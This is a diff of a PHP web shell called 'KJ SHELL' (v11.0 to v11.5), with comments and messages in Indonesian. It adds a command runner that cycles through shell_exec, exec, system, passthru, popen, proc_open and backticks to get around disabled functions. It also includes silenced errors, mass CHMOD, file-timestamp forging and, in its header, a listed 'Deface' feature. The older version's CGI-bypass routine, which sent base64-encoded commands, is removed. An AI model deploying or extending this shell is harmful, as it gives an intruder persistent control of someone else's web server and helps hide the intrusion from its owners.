@@ -1,29 +1,29 @@
 <?php
 // ============================================================
-// 🚀 KJ SHELL v11.0 - FIXED & ENHANCED
+// 🚀 KJ SHELL v11.5 - FULL FEATURES
 // ============================================================
-// ✅ FIXED: Keamanan (CSRF, Password, Session, Rate Limiting)
-// ✅ FIXED: Kode Quality (Hapus duplikasi, Error handling)
-// ✅ FIXED: Stabilitas (Edit file, CHMOD mass, Log)
-// ✅ NEW: Timestep (Ubah timestamp file/folder)
-// ✅ NEW: Activity Log Viewer dengan filter
+// ✅ All features: Files, Command, Download, CHMOD, Timestep
+// ✅ Extract, Zip, Deface, Info
+// ✅ Support shell_exec + PHP Native fallback
+// ✅ Fix delete file & folder
 // ============================================================
+
+// ===================== ERROR HANDLING ======================
+error_reporting(0);
+ini_set('display_errors', 0);
 
 // ===================== BRANDING CONFIG ======================
 $branding = [
     'name' => 'KJ SHELL',
     'short_name' => 'KJ Team',
     'team' => 'KJ Team',
-    'version' => 'v11.0 Ultimate',
-    'author' => 'KJ Team',
-    'year' => '2026',
-//    'icon' => '⚡'
+    'version' => 'v11.5 Full',
+    'year' => '2026'
 ];
 
-// ===================== KONFIGURASI ==========================
+// ===================== KONFIGURASI ======================
 $config = [
     'username' => 'admin',
-    // GANTI PASSWORD: gunakan password_hash('password_baru_kuat', PASSWORD_DEFAULT)
     'password_hash' => '$2y$10$BPWemxV6f2QwzagGbP2eOu8msHN8P3EifdU2sgedwNHzGw7/7JOy6',
     'root_path' => __DIR__,
     'max_upload_size' => 50 * 1024 * 1024,
@@ -36,8 +36,23 @@ $config = [
     'csrf_token_name' => 'kj_csrf_token'
 ];
 
+// ===================== LOG FUNCTION ======================
+function logActivity($message) {
+    global $config;
+    if (!$config['log_activity']) return;
+    
+    $log_file = __DIR__ . '/' . $config['log_file'];
+    $log_entry = '[' . date('Y-m-d H:i:s') . '] ' . 
+                 'IP: ' . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . ' | ' . 
+                 'User: ' . $config['username'] . ' | ' . 
+                 $message . "\n";
+    @file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
+}
+
 // ===================== START SESSION ======================
-session_start();
+if (session_status() === PHP_SESSION_NONE) {
+    @session_start();
+}
 
 // ===================== CSRF PROTECTION ======================
 function generateCSRFToken() {
@@ -59,9 +74,9 @@ function verifyCSRFToken($token) {
 // ===================== RATE LIMITING ======================
 function checkLoginAttempts() {
     global $config;
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $key = 'login_attempts_' . $ip;
-    $lock_key = 'login_lockout_' . $ip;
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+    $key = 'login_attempts_' . md5($ip);
+    $lock_key = 'login_lockout_' . md5($ip);
     
     if (isset($_SESSION[$lock_key]) && $_SESSION[$lock_key] > time()) {
         return ['locked' => true, 'remaining' => $_SESSION[$lock_key] - time()];
@@ -76,9 +91,9 @@ function checkLoginAttempts() {
 
 function incrementLoginAttempts() {
     global $config;
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $key = 'login_attempts_' . $ip;
-    $lock_key = 'login_lockout_' . $ip;
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+    $key = 'login_attempts_' . md5($ip);
+    $lock_key = 'login_lockout_' . md5($ip);
     
     $_SESSION[$key] = ($_SESSION[$key] ?? 0) + 1;
     
@@ -88,9 +103,9 @@ function incrementLoginAttempts() {
 }
 
 function resetLoginAttempts() {
-    $ip = $_SERVER['REMOTE_ADDR'];
-    unset($_SESSION['login_attempts_' . $ip]);
-    unset($_SESSION['login_lockout_' . $ip]);
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+    unset($_SESSION['login_attempts_' . md5($ip)]);
+    unset($_SESSION['login_lockout_' . md5($ip)]);
 }
 
 // ===================== LOGIN SYSTEM ======================
@@ -98,8 +113,8 @@ function requireLogin() {
     global $config;
     
     if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > $config['session_timeout'])) {
-        session_destroy();
-        session_start();
+        @session_destroy();
+        @session_start();
         $_SESSION['logout_reason'] = 'Session expired';
         header('Location: ' . $_SERVER['PHP_SELF'] . '?logout=1');
         exit;
@@ -107,7 +122,7 @@ function requireLogin() {
     $_SESSION['last_activity'] = time();
     
     if (!isset($_SESSION['session_regenerated']) || $_SESSION['session_regenerated'] < time() - 300) {
-        session_regenerate_id(true);
+        @session_regenerate_id(true);
         $_SESSION['session_regenerated'] = time();
     }
     
@@ -125,23 +140,23 @@ function requireLogin() {
             
             resetLoginAttempts();
             $_SESSION['logged_in'] = true;
-            $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
-            $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
-            logActivityMulti("✅ Login successful from " . $_SERVER['REMOTE_ADDR']);
+            $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+            $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? '';
+            logActivity("✅ Login successful from " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown'));
             header('Location: ' . $_SERVER['PHP_SELF'] . '?login_success=1');
             exit;
         } else {
             incrementLoginAttempts();
-            logActivityMulti("❌ Login failed from " . $_SERVER['REMOTE_ADDR']);
+            logActivity("❌ Login failed from " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown'));
             showLoginPage("❌ Username atau password salah!");
             exit;
         }
     }
     
     if (isset($_GET['logout'])) {
-        logActivityMulti("User logged out");
-        session_destroy();
-        session_start();
+        logActivity("User logged out");
+        @session_destroy();
+        @session_start();
         header('Location: ' . $_SERVER['PHP_SELF']);
         exit;
     }
@@ -151,10 +166,10 @@ function requireLogin() {
         exit;
     }
     
-    if ($_SESSION['ip'] !== $_SERVER['REMOTE_ADDR'] || 
-        $_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
-        session_destroy();
-        session_start();
+    if (($_SESSION['ip'] ?? '') !== ($_SERVER['REMOTE_ADDR'] ?? '') || 
+        ($_SESSION['user_agent'] ?? '') !== ($_SERVER['HTTP_USER_AGENT'] ?? '')) {
+        @session_destroy();
+        @session_start();
         showLoginPage("⚠️ Session tidak valid. Silakan login ulang.");
         exit;
     }
@@ -214,7 +229,8 @@ function showLoginPage($error = null) {
                 100% { transform: translate(20px, -20px) scale(1.05); }
             }
             .login-wrapper {
-                position: relative;z-index: 1;
+                position: relative;
+                z-index: 1;
                 width: 100%;
                 max-width: 380px;
                 padding: 15px;
@@ -222,21 +238,12 @@ function showLoginPage($error = null) {
             .login-container {
                 background: rgba(20, 28, 58, 0.55);
                 backdrop-filter: blur(24px);
-                -webkit-backdrop-filter: blur(24px);
                 border-radius: 20px;
                 padding: 35px 32px 30px;
                 border: 1px solid rgba(255, 255, 255, 0.06);
                 box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
             }
             .brand-header { text-align: center; margin-bottom: 28px; }
-            .brand-icon {
-                display: inline-block;
-                font-size: 36px;
-                margin-bottom: 10px;
-                background: linear-gradient(135deg, #42a5f5, #7c4dff);
-                -webkit-background-clip: text;
-                -webkit-text-fill-color: transparent;
-            }
             .brand-title {
                 font-size: 20px;
                 font-weight: 700;
@@ -330,20 +337,6 @@ function showLoginPage($error = null) {
                 color: rgba(255, 255, 255, 0.06);
                 font-size: 12px;
             }
-            .toggle-password {
-                position: absolute;
-                right: 12px;
-                top: 50%;
-                transform: translateY(-50%);
-                background: none;
-                border: none;
-                color: rgba(255, 255, 255, 0.06);
-                cursor: pointer;
-                font-size: 12px;
-                transition: 0.3s;
-                padding: 4px;
-            }
-            .toggle-password:hover { color: rgba(255, 255, 255, 0.15); }
             .btn-login {
                 width: 100%;
                 padding: 11px;
@@ -363,12 +356,6 @@ function showLoginPage($error = null) {
                 border-color: rgba(66, 165, 245, 0.2);
                 transform: translateY(-1px);
                 box-shadow: 0 8px 30px rgba(66, 165, 245, 0.08);
-            }
-            .btn-login .btn-content {
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                gap: 10px;
             }
             .login-footer {
                 text-align: center;
@@ -421,9 +408,10 @@ function showLoginPage($error = null) {
             @media (max-width: 480px) {
                 .login-container { padding: 28px 22px 24px; border-radius: 16px; }
                 .brand-title { font-size: 17px; }
-                .brand-icon { font-size: 30px; }
-            }</style>
-    </head><body>
+            }
+        </style>
+    </head>
+    <body>
         <div class="bg-layer"></div>
         <div class="orb orb-1"></div>
         <div class="orb orb-2"></div>
@@ -471,17 +459,14 @@ function showLoginPage($error = null) {
                         <div class="input-wrapper">
                             <span class="icon"><i class="fas fa-key"></i></span>
                             <input type="password" name="login_pass" id="login_pass" placeholder="Enter password" required>
-                            <button type="button" class="toggle-password" onclick="togglePassword()">
-                                <i class="fas fa-eye" id="toggleIcon"></i>
-                            </button>
                         </div>
                     </div>
                     
-                    <button type="submit" class="btn-login" id="loginBtn">
+                    <button type="submit" class="btn-login">
                         <span class="btn-content">
                             <i class="fas fa-sign-in-alt"></i>
                             <span>Access</span>
-                            <i class="fas fa-arrow-right btn-arrow" style="font-size:11px;"></i>
+                            <i class="fas fa-arrow-right" style="font-size:11px;"></i>
                         </span>
                     </button>
                     
@@ -495,219 +480,232 @@ function showLoginPage($error = null) {
                 </form>
             </div>
         </div>
-        
-        <script>
-        function togglePassword() {
-            var passInput = document.getElementById('login_pass');
-            var icon = document.getElementById('toggleIcon');
-            if (passInput.type === 'password') {
-                passInput.type = 'text';
-                icon.className = 'fas fa-eye-slash';
-            } else {
-                passInput.type = 'password';
-                icon.className = 'fas fa-eye';
-            }
-        }
-        document.addEventListener('DOMContentLoaded', function() {
-            var userInput = document.querySelector('input[name="login_user"]');
-            if (!userInput.value) userInput.focus();
-        });
-        </script>
     </body>
     </html>
     <?php
     exit;
 }
 
-// ===================== CORE FUNCTIONS ======================
+// ===================== UNIVERSAL COMMAND EXECUTION ======================
+function kjEx($cmd, $re = false) {
+    if ($re) {
+        $cmd = $cmd . " 2>&1";
+    }
+    
+    $output = '';
+    $disabled = explode(',', ini_get('disable_functions') ?? '');
+    
+    // Try shell_exec
+    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled)) {
+        try {
+            $output = @shell_exec($cmd);
+            if ($output !== null && !empty($output)) return $output;
+        } catch (Exception $e) {}
+    }
+    
+    // Try exec
+    if (function_exists('exec') && !in_array('exec', $disabled)) {
+        try {
+            $output_arr = [];
+            @exec($cmd, $output_arr);
+            if (!empty($output_arr)) {
+                return implode("\n", $output_arr);
+            }
+        } catch (Exception $e) {}
+    }
+    
+    // Try system
+    if (function_exists('system') && !in_array('system', $disabled)) {
+        try {
+            ob_start();
+            @system($cmd);
+            $output = ob_get_clean();
+            if (!empty($output)) return $output;
+        } catch (Exception $e) {}
+    }
+    
+    // Try passthru
+    if (function_exists('passthru') && !in_array('passthru', $disabled)) {
+        try {
+            ob_start();
+            @passthru($cmd);
+            $output = ob_get_clean();
+            if (!empty($output)) return $output;
+        } catch (Exception $e) {}
+    }
+    
+    // Try popen
+    if (function_exists('popen') && !in_array('popen', $disabled)) {
+        try {
+            $fp = @popen($cmd, 'r');
+            if ($fp !== false) {
+                $output = '';
+                while (!@feof($fp)) {
+                    $output .= @fread($fp, 4096);
+                }
+                @pclose($fp);
+                if (!empty($output)) return $output;
+            }
+        } catch (Exception $e) {}
+    }
+    
+    // Try proc_open
+    if (function_exists('proc_open') && !in_array('proc_open', $disabled)) {
+        try {
+            $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
+            $process = @proc_open($cmd, $descriptors, $pipes);
+            if (is_resource($process)) {
+                @fclose($pipes[0]);
+                $output = @stream_get_contents($pipes[1]);
+                $error = @stream_get_contents($pipes[2]);
+                @fclose($pipes[1]);
+                @fclose($pipes[2]);
+                @proc_close($process);
+                if (!empty($error)) {
+                    $output .= "\n[STDERR]\n" . $error;
+                }
+                if (!empty($output)) return $output;
+            }
+        } catch (Exception $e) {}
+    }
+    
+    // Try backtick
+    try {
+        $output = @`$cmd`;
+        if (!empty($output)) return $output;
+    } catch (Exception $e) {}
+    
+    return "[!] Command execution failed. No method available.\n[!] Command: " . $cmd . "\n[!] Disabled functions: " . (ini_get('disable_functions') ?: 'none');
+}
 
-error_reporting(E_ALL);
-@ini_set('display_errors', 0);
-@ini_set('max_execution_time', 0);
-@set_time_limit(0);
-@ignore_user_abort(true);
+function _kj_can_runCommand() {
+    $result = kjEx('echo "test"');
+    return !empty($result) && strpos($result, 'test') !== false;
+}
+
+function getEnvironmentInfo() {
+    $info = [];
+    $info['php_version'] = phpversion();
+    $info['os'] = PHP_OS;
+    $info['user'] = get_current_user() ?? 'Unknown';
+    $info['disabled_functions'] = ini_get('disable_functions') ?: 'none';
+    
+    $methods = ['shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open'];
+    $available = [];
+    $disabled = explode(',', ini_get('disable_functions') ?? '');
+    foreach ($methods as $method) {
+        if (function_exists($method) && !in_array($method, $disabled)) {
+            $available[] = $method;
+        }
+    }
+    $info['available_methods'] = $available;
+    $info['command_works'] = _kj_can_runCommand();
+    
+    return $info;
+}
+
+// ===================== CORE FUNCTIONS ======================
 
 $GLOBALS['sys'] = (strtolower(substr(PHP_OS, 0, 3)) == "win") ? 'win' : 'unix';
 $GLOBALS['cwd'] = str_replace('\\', '/', getcwd());
 $GLOBALS['config'] = $config;
 
-// ---- Base64 Encode/Decode ----
-function kj_base64_encode($s) {
-    if(function_exists('base64_encode')) return base64_encode($s);
-    $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-    $enc = '';
-    for($i=0; $i<strlen($s); $i+=3) {
-        $o1 = ord($s[$i]);
-        $o2 = isset($s[$i+1]) ? ord($s[$i+1]) : 0;
-        $o3 = isset($s[$i+2]) ? ord($s[$i+2]) : 0;
-        $bits = ($o1 << 16) | ($o2 << 8) | $o3;
-        $h1 = ($bits >> 18) & 0x3f;
-        $h2 = ($bits >> 12) & 0x3f;
-        $h3 = ($bits >> 6) & 0x3f;
-        $h4 = $bits & 0x3f;
-        $enc .= $b64[$h1] . $b64[$h2] . $b64[$h3] . $b64[$h4];
-    }
-    return $enc;
+function formatSize($bytes) {
+    if ($bytes == 0) return '0 B';
+    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
+    $i = floor(log($bytes, 1024));
+    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
 }
 
-function kj_base64_decode($s) {
-    if(function_exists('base64_decode')) return base64_decode($s);
-    $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-    $dec = '';
-    $s = preg_replace('[^A-Za-z0-9\+\/\=]', "", $s);
-    for($i=0; $i<strlen($s); $i+=4) {
-        $h1 = strpos($b64, $s[$i]);
-        $h2 = strpos($b64, $s[$i+1]);
-        $h3 = strpos($b64, $s[$i+2]);
-        $h4 = strpos($b64, $s[$i+3]);
-        $bits = ($h1 << 18) | ($h2 << 12) | ($h3 << 6) | $h4;
-        $o1 = ($bits >> 16) & 0xff;
-        $o2 = ($bits >> 8) & 0xff;
-        $o3 = $bits & 0xff;
-        $dec .= chr($o1);
-        if($h3 != 64) $dec .= chr($o2);
-        if($h4 != 64) $dec .= chr($o3);
-    }
-    return $dec;
-}
-
-// ---- Command Execution ----
-function kjEx($in, $re=false, $cgi=true, $all=false) {
-    $data = _kj_php_cmd($in, $re);
-    if(empty($data) && $cgi || $all) {
-        if($GLOBALS['sys'] == 'unix') {
-            if(strlen(_kj_php_cmd("whoami")) == 0 || $all) {
-                $cmd = _kj_cgicmd($in);
-                if(!empty($cmd)) return $cmd;
-            }
-        }
-    }
-    return $data;
-}
-
-function _kj_php_cmd($in, $re=false) {
-    $out = '';
-    try {
-        if($re) $in = $in . " 2>&1";
-        
-        if(function_exists('exec')) {
-            @exec($in, $out);
-            $out = @join("\n", $out);
-        } elseif(function_exists('passthru')) {
-            ob_start();
-            @passthru($in);
-            $out = ob_get_clean();
-        } elseif(function_exists('system')) {
-            ob_start();
-            @system($in);
-            $out = ob_get_clean();
-        } elseif(function_exists('shell_exec')) {
-            $out = shell_exec($in);
-        } elseif(function_exists("popen") && function_exists("pclose")) {
-            if(is_resource($f = @popen($in, "r"))) {
-                $out = "";
-                while(!@feof($f)) $out .= fread($f, 1024);
-                pclose($f);
-            }
-        } elseif(function_exists('proc_open')) {
-            $pipes = array();
-            $process = @proc_open($in.' 2>&1', array(
-                array("pipe","w"), array("pipe","w"), array("pipe","w")
-            ), $pipes, null);
-            $out = @stream_get_contents($pipes[1]);
-        } elseif(class_exists('COM')) {
-            $ws = new COM('WScript.shell');
-            $exec = $ws->exec('cmd.exe /c '.$in);
-            $stdout = $exec->StdOut();
-            $out = $stdout->ReadAll();
-        }
-    } catch(Exception $e) {
-        return 'Error: ' . $e->getMessage();
-    }
-    return $out;
-}
-
-function _kj_cgicmd($cmd, $lang="perl", $set_cookie=false) {
-    $is_curl = function_exists('curl_version');
-    $is_socket = function_exists('fsockopen');
+// ===================== DELETE FUNCTION (FIXED) ======================
+function deleteItem($path) {
+    $full_path = realpath($path);
     
-    if($is_curl || $is_socket) {
-        $cgi_url = "cgibypass." . ($lang == "perl"? "pl" : "py");
-        $cmd = "check=api&cmd=" . kj_base64_encode("cd ".$GLOBALS['cwd'].";".$cmd);
-        
-        if($is_curl) {
-            $address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://") .
-                       $_SERVER["SERVER_NAME"] . 
-                       dirname($_SERVER["REQUEST_URI"]) . "/" . $cgi_url;
-            $data = _kj_curl_request($address, "post", $cmd);
-        } elseif($is_socket) {
-            $server = $_SERVER["SERVER_NAME"];
-            $uri = dirname($_SERVER["REQUEST_URI"]) . "/" . $cgi_url;
-            $data = _kj_socket_request($server, $uri, $cmd);
+    // Prevent deleting script itself or parent
+    if ($full_path == __DIR__ || $full_path == dirname(__DIR__)) {
+        logActivity("❌ Delete blocked: " . $full_path);
+        return false;
+    }
+    
+    if (!file_exists($full_path)) {
+        logActivity("❌ Delete failed: File not found - " . $full_path);
+        return false;
+    }
+    
+    // Try to make writable first
+    if (!is_writable($full_path)) {
+        @chmod($full_path, 0777);
+    }
+    
+    if (is_dir($full_path)) {
+        try {
+            $files = array_diff(scandir($full_path), ['.', '..']);
+            foreach ($files as $file) {
+                $sub_path = $full_path . '/' . $file;
+                if (!deleteItem($sub_path)) {
+                    return false;
+                }
+            }
+            if (@rmdir($full_path)) {
+                logActivity("✅ Deleted directory: " . $full_path);
+                return true;
+            }
+            return false;
+        } catch (Exception $e) {
+            logActivity("❌ Delete error: " . $e->getMessage());
+            return false;
         }
-        
-        $out = "";
-        if(strpos($data, "[api]") !== false) {
-            if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)) $out = $res[1];
+    } else {
+        if (@unlink($full_path)) {
+            logActivity("✅ Deleted file: " . $full_path);
+            return true;
         }
-        return trim($out);
+        logActivity("❌ Failed to delete file: " . $full_path);
+        return false;
     }
-    return "";
 }
 
-function _kj_socket_request($server, $uri, $post) {
-    $socket = @fsockopen($server, 80, $errno, $errstr, 15);
-    if($socket) {
-        $http  = "POST {$uri} HTTP/1.0\r\n";
-        $http .= "Host: {$server}\r\n";
-        $http .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
-        $http .= "Content-Type: application/x-www-form-urlencoded\r\n";
-        $http .= "Content-length: " . strlen($post) . "\r\n";
-        $http .= "Connection: close\r\n\r\n";
-        $http .= $post . "\r\n\r\n";
-        fwrite($socket, $http);
-        $contents = "";
-        while (!@feof($socket)) $contents .= @fgets($socket, 4096);
-        list($header, $body) = explode("\r\n\r\n", $contents, 2);
-        @fclose($socket);
-        return $body;
+// ===================== GET DIRECTORY CONTENT ======================
+function getDirectoryContent($path) {
+    $items = [];
+    $full_path = realpath($path);
+    if (!is_dir($full_path)) return false;
+    
+    try {
+        $files = scandir($full_path);
+        foreach ($files as $file) {
+            if ($file == '.' || $file == '..') continue;
+            $file_path = $full_path . '/' . $file;
+            if (!file_exists($file_path)) continue;
+            
+            $is_dir = is_dir($file_path);
+            $permissions = substr(sprintf('%o', fileperms($file_path)), -4);
+            $is_root = ($permissions == '777' || $permissions == '666');
+            
+            $items[] = [
+                'name' => $file,
+                'path' => $file_path,
+                'is_dir' => $is_dir,
+                'is_root' => $is_root,
+                'size' => is_file($file_path) ? filesize($file_path) : 0,
+                'modified' => filemtime($file_path),
+                'permissions' => $permissions,
+                'writable' => is_writable($file_path)
+            ];
+        }
+    } catch (Exception $e) {
+        return false;
     }
-    return "";
+    
+    usort($items, function($a, $b) {
+        if ($a['is_dir'] == $b['is_dir']) return strcasecmp($a['name'], $b['name']);
+        return $a['is_dir'] ? -1 : 1;
+    });
+    
+    return $items;
 }
 
-function _kj_curl_request($url, $method="get", $data="") {
-    if(!function_exists('curl_init')) return false;
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-    if($method == 'post') {
-        curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-    }
-    $result = curl_exec($ch);
-    curl_close($ch);
-    return $result;
-}
-
-function kjWhich($p) {
-    $path = kjEx('which ' . $p, false, false);
-    return (!empty($path)) ? strlen($path) : false;
-}
-
-function _kj_can_runCommand($cgi=true, $cache=true) {
-    if(isset($_COOKIE["kj_canruncmd"]) && $cache) return true;
-    if(strlen(kjEx("whoami", false, $cgi)) > 0) {
-        $_COOKIE["kj_canruncmd"] = true;
-        return true;
-    }
-    return false;
-}
-
-// ===================== CHMOD MANAGER ======================
-
+// ===================== CHMOD FUNCTIONS ======================
 function chmodSingle($path, $permission) {
     $full_path = realpath($path);
     if (!$full_path || !file_exists($full_path)) {
@@ -715,33 +713,27 @@ function chmodSingle($path, $permission) {
     }
     
     $perm_octal = octdec($permission);
+    $success = false;
     
     try {
         if (@chmod($full_path, $perm_octal)) {
-            logActivityMulti("CHMOD: " . $full_path . " → " . $permission, dirname($full_path));
-            return array(
-                'status' => true, 
-                'message' => "✅ Permission changed: " . basename($full_path) . " → " . $permission,
-                'path' => $full_path,
-                'permission' => $permission
-            );
+            $success = true;
         }
-    } catch(Exception $e) {
-        // Fallback to command
+    } catch (Exception $e) {}
+    
+    if (!$success) {
+        $cmd = "chmod " . $permission . " '" . addslashes($full_path) . "' 2>&1";
+        $result = kjEx($cmd);
+        if (empty($result) || strpos($result, 'chmod:') === false) {
+            $success = true;
+        }
     }
     
-    $cmd = "chmod " . $permission . " '" . addslashes($full_path) . "' 2>&1";
-    $result = kjEx($cmd);
-    if (empty($result) || strpos($result, 'chmod:') === false) {
-        logActivityMulti("CHMOD (cmd): " . $full_path . " → " . $permission, dirname($full_path));
-        return array(
-            'status' => true,
-            'message' => "✅ Permission changed (via command): " . basename($full_path) . " → " . $permission,
-            'path' => $full_path,
-            'permission' => $permission
-        );
+    if ($success) {
+        logActivity("CHMOD: " . $full_path . " → " . $permission);
+        return array('status' => true, 'message' => "✅ Permission changed: " . basename($full_path) . " → " . $permission);
     } else {
-        return array('status' => false, 'message' => "❌ Gagal change permission: " . $result);
+        return array('status' => false, 'message' => "❌ Gagal change permission: " . $path);
     }
 }
 
@@ -751,7 +743,6 @@ function chmodMass($dir, $file_permission = '644', $dir_permission = '755', $rec
         return array('status' => false, 'message' => "❌ Direktori tidak ditemukan: " . $dir);
     }
     
-    $results = [];
     $total_files = 0;
     $total_dirs = 0;
     $success_files = 0;
@@ -766,48 +757,49 @@ function chmodMass($dir, $file_permission = '644', $dir_permission = '755', $rec
     }
     $total_dirs++;
     
-    $iterator = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS),
-        RecursiveIteratorIterator::SELF_FIRST
-    );
-    $iterator->setMaxDepth(20);
-    
-    foreach ($iterator as $item) {
-        $path = $item->getPathname();
-        $is_dir = $item->isDir();
-        
-        if ($is_dir) {
-            $total_dirs++;
-            $result = chmodSingle($path, $dir_permission);
-            if ($result['status']) {
-                $success_dirs++;
-            } else {
-                $errors[] = $result['message'];
+    if ($recursive) {
+        try {
+            $iterator = new RecursiveIteratorIterator(
+                new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS),
+                RecursiveIteratorIterator::SELF_FIRST
+            );
+            
+            foreach ($iterator as $item) {
+                $path = $item->getPathname();
+                $is_dir = $item->isDir();
+                
+                if ($is_dir) {
+                    $total_dirs++;
+                    $result = chmodSingle($path, $dir_permission);
+                    if ($result['status']) {
+                        $success_dirs++;
+                    } else {
+                        $errors[] = $result['message'];
+                    }
+                } else {
+                    $total_files++;
+                    $result = chmodSingle($path, $file_permission);
+                    if ($result['status']) {
+                        $success_files++;
+                    } else {
+                        $errors[] = $result['message'];
+                    }
+                }
             }
-        } else {
-            $total_files++;
-            $result = chmodSingle($path, $file_permission);
-            if ($result['status']) {
-                $success_files++;
-            } else {
-                $errors[] = $result['message'];
-            }
+        } catch (Exception $e) {
+            $errors[] = "Error: " . $e->getMessage();
         }
     }
     
-    $summary = [
+    return [
         'status' => (count($errors) == 0),
         'total_files' => $total_files,
         'success_files' => $success_files,
         'total_dirs' => $total_dirs,
         'success_dirs' => $success_dirs,
         'errors' => $errors,
-        'message' => "✅ CHMOD Massal selesai!\n   📁 Direktori: " . $success_dirs . "/" . $total_dirs . " berhasil\n   📄 File: " . $success_files . "/" . $total_files . " berhasil\n" . (count($errors) > 0 ? "   ❌ Error: " . count($errors) : "")
+        'message' => "✅ CHMOD Massal selesai!\n   📁 Direktori: " . $success_dirs . "/" . $total_dirs . " berhasil\n   📄 File: " . $success_files . "/" . $total_files . " berhasil"
     ];
-    
-    logActivityMulti("Mass CHMOD: " . $full_path . " (file:" . $file_permission . ", dir:" . $dir_permission . ")", $full_path);
-    
-    return $summary;
 }
 
 function chmodByPattern($dir, $pattern, $permission) {
@@ -816,44 +808,46 @@ function chmodByPattern($dir, $pattern, $permission) {
         return array('status' => false, 'message' => "❌ Direktori tidak ditemukan: " . $dir);
     }
     
-    $results = [];
     $total = 0;
     $success = 0;
     $errors = [];
     
-    $iterator = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS)
-    );
-    $iterator->setMaxDepth(15);
-    
-    foreach ($iterator as $item) {
-        if (!$item->isFile()) continue;
+    try {
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS)
+        );
         
-        $filename = $item->getFilename();
-        $path = $item->getPathname();
-        
-        $match = false;
-        if (strpos($pattern, '*') !== false) {
-            $pattern_regex = '/^' . str_replace('*', '.*', preg_quote($pattern, '/')) . '$/i';
-            if (preg_match($pattern_regex, $filename)) $match = true;
-        } elseif (strpos($pattern, ',') !== false) {
-            $exts = array_map('trim', explode(',', $pattern));$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-            if (in_array($ext, $exts)) $match = true;
-        } else {
-            $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-            if ($ext == $pattern) $match = true;
-        }
-        
-        if ($match) {
-            $total++;
-            $result = chmodSingle($path, $permission);
-            if ($result['status']) {
-                $success++;
-                $results[] = $result['message'];
+        foreach ($iterator as $item) {
+            if (!$item->isFile()) continue;
+            
+            $filename = $item->getFilename();
+            $path = $item->getPathname();
+            
+            $match = false;
+            if (strpos($pattern, '*') !== false) {
+                $pattern_regex = '/^' . str_replace('*', '.*', preg_quote($pattern, '/')) . '$/i';
+                if (preg_match($pattern_regex, $filename)) $match = true;
+            } elseif (strpos($pattern, ',') !== false) {
+                $exts = array_map('trim', explode(',', $pattern));
+                $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+                if (in_array($ext, $exts)) $match = true;
             } else {
-                $errors[] = $result['message'];
+                $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+                if ($ext == $pattern) $match = true;
+            }
+            
+            if ($match) {
+                $total++;
+                $result = chmodSingle($path, $permission);
+                if ($result['status']) {
+                    $success++;
+                } else {
+                    $errors[] = $result['message'];
+                }
             }
         }
+    } catch (Exception $e) {
+        $errors[] = "Error: " . $e->getMessage();
     }
     
     return [
@@ -861,23 +855,25 @@ function chmodByPattern($dir, $pattern, $permission) {
         'total' => $total,
         'success' => $success,
         'errors' => $errors,
-        'message' => "✅ CHMOD by Pattern selesai!\n   📄 File ditemukan: " . $total . "\n   ✅ Berhasil: " . $success . "\n" . (count($errors) > 0 ? "   ❌ Error: " . count($errors) : "")];
+        'message' => "✅ CHMOD by Pattern selesai!\n   📄 File ditemukan: " . $total . "\n   ✅ Berhasil: " . $success
+    ];
 }
 
 // ===================== TIMESTEP FUNCTIONS ======================
-
 function changeTimestamp($path, $timestamp, $type = 'both') {
     $full_path = realpath($path);
     if (!$full_path || !file_exists($full_path)) {
         return array('status' => false, 'message' => "❌ File/Folder tidak ditemukan: " . $path);
     }
     
+    $success = false;
     $results = [];
     
     try {
         if ($type == 'both' || $type == 'mtime') {
             if (@touch($full_path, $timestamp)) {
                 $results[] = "✅ Modified time updated: " . date('Y-m-d H:i:s', $timestamp);
+                $success = true;
             } else {
                 $results[] = "❌ Failed to update modified time";
             }
